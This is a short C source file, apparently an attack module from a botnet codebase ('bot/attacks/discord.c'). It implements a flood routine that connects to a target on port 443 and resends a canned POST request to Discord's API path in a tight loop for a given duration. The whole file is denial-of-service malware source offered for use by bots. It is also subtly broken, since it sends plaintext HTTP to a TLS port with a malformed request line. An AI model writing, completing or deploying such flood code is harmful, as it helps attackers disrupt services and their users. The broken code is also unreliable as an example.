// language: c
// file: bot/attacks/discord.c
// runtime: gcc / cross-compiled via make scripts
// target: Linux raw/socket-based connection stress or webhook flood implementation

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "discord.h"

void attack_discord(uint8_t duration, uint32_t endpoint) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(443);
    serv_addr.sin_addr.s_addr = endpoint;

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock);
        return;
    }

    const char *payload = "POST /api/v9/channels/ 1.1\r\nHost: discord.com\r\nContent-Length: 0\r\n\r\n";
    
    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        send(sock, payload, strlen(payload), 0);
    }

    close(sock);
}